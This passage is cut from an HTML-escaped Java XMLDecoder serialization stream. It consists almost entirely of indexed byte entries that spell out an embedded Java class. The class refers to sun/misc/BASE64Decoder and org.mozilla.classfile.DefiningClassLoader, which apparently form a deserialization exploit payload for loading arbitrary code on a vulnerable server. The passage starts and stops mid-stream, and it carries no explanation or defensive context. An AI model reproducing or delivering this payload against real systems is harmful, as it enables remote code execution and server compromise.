index="4095"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4096"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4097"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="4098"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4099"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4100"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4101"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="4102"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4103"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="4104"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4105"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="4106"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4107"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4108"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4109"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="4110"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4111"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="4112"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4113"&gt;&lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="4114"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4115"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="4116"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4117"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4118"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4119"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4120"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4121"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="4122"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4123"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4124"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="4125"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="4126"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4127"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4128"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="4129"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="4130"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4131"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4132"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="4133"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="4134"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4135"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4136"&gt;&lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="4137"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="4138"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4139"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4140"&gt;&lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="4141"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="4142"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4143"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4144"&gt;&lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="4145"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="4146"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4147"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4148"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="4149"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="4150"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4151"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4152"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="4153"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4154"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4155"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="4156"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="4157"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4158"&gt;&lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="4159"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="4160"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4161"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4162"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4163"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4164"&gt;&lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="4165"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4166"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4167"&gt;&lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="4168"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4169"&gt;&lt;byte&gt;52&lt;/byte&gt;&lt;/void&gt;&lt;void index="4170"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4171"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4172"&gt;&lt;byte&gt;107&lt;/byte&gt;&lt;/void&gt;&lt;void index="4173"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4174"&gt;&lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="4175"&gt;&lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="4176"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4177"&gt;&lt;byte&gt;54&lt;/byte&gt;&lt;/void&gt;&lt;void index="4178"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4179"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4180"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="4181"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4182"&gt;&lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="4183"&gt;&lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="4184"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4185"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4186"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4187"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="4188"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4189"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4190"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4191"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4192"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4193"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4194"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4195"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4196"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4197"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4198"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4199"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="4200"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="4201"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4202"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4203"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4204"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4205"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="4206"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4207"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4208"&gt;&lt;byte&gt;52&lt;/byte&gt;&lt;/void&gt;&lt;void index="4209"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4210"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4211"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4212"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4213"&gt;&lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="4214"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4215"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4216"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="4217"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4218"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4219"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4220"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4221"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="4222"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4223"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4224"&gt;&lt;byte&gt;56&lt;/byte&gt;&lt;/void&gt;&lt;void index="4225"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4226"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4227"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4228"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4229"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="4230"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4231"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4232"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="4233"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4234"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4235"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4236"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4237"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4238"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4239"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4240"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4241"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4242"&gt;&lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="4243"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4244"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4245"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4246"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4247"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4248"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4249"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4250"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4251"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4252"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4253"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="4254"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4255"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4256"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="4257"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4258"&gt;&lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="4259"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4260"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4261"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4262"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4263"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4264"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="4265"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4266"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4267"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4268"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4269"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="4270"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4271"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4272"&gt;&lt;byte&gt;52&lt;/byte&gt;&lt;/void&gt;&lt;void index="4273"&gt;&lt;byte&gt;61&lt;/byte&gt;&lt;/void&gt;&lt;void index="4274"&gt;&lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="4276"&gt;&lt;byte&gt;62&lt;/byte&gt;&lt;/void&gt;&lt;void index="4277"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4279"&gt;&lt;byte&gt;22&lt;/byte&gt;&lt;/void&gt;&lt;void index="4280"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4281"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="4282"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4283"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4284"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="4285"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4286"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4287"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4288"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4289"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4290"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4291"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="4292"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="4293"&gt;&lt;byte&gt;54&lt;/byte&gt;&lt;/void&gt;&lt;void index="4294"&gt;&lt;byte&gt;52&lt;/byte&gt;&lt;/void&gt;&lt;void index="4295"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4296"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4297"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4298"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4299"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="4300"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4301"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4302"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="4304"&gt;&lt;byte&gt;64&lt;/byte&gt;&lt;/void&gt;&lt;void index="4305"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="4307"&gt;&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4309"&gt;&lt;byte&gt;34&lt;/byte&gt;&lt;/void&gt;&lt;void index="4310"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4312"&gt;&lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="4313"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4314"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="4315"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4316"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4317"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="4318"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4319"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4320"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4321"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4322"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="4323"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="4324"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4325"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4326"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4327"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4328"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4329"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4330"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4331"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4332"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4333"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4334"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4335"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="4336"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4337"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4338"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="4340"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="4341"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4343"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="4344"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="4345"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4346"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4347"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4348"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="4349"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4350"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4351"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="4352"&gt;&lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="4353"&gt;&lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="4354"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4355"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4356"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4358"&gt;&lt;byte&gt;22&lt;/byte&gt;&lt;/void&gt;&lt;void index="4359"&gt;&lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="4360"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="4361"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="4362"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4363"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="4364"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4365"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4366"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4367"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4368"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4369"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4370"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4371"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="4372"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4373"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4374"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4375"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4376"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4377"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="4378"&gt;&lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="4379"&gt;&lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="4380"&gt;&lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4381"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="4383"&gt;&lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="4385"&gt;&lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="4386"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="4388"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4390"&gt;&lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="4391"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4393"&gt;&lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="4394"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4395"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4396"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4397"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4398"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="4399"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4400"&gt;&lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="4401"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4402"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4403"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4404"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4405"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4406"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4407"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4408"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4409"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4410"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4411"&gt;&lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="4412"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4413"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4414"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4415"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4416"&gt;&lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4417"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4418"&gt;&lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="4419"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4420"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4421"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4422"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4423"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4424"&gt;&lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="4425"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4426"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4427"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4428"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4429"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="4430"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4431"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4432"&gt;&lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="4433"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4434"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void 